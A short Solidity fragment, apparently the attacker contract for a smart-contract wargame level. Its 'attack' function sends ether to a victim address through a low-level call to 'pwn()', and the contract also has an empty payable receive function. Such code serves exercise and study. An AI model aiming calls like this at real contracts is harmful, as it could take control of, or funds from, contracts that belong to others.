    function attack(address payable _victim) public payable {

    address to = payable(_victim);
    (bool sent, ) = to.call{value: msg.value}(abi.encodeWithSignature("pwn()"));
    require(sent , "transfer failed");

    }


    receive()external payable{ 
    }
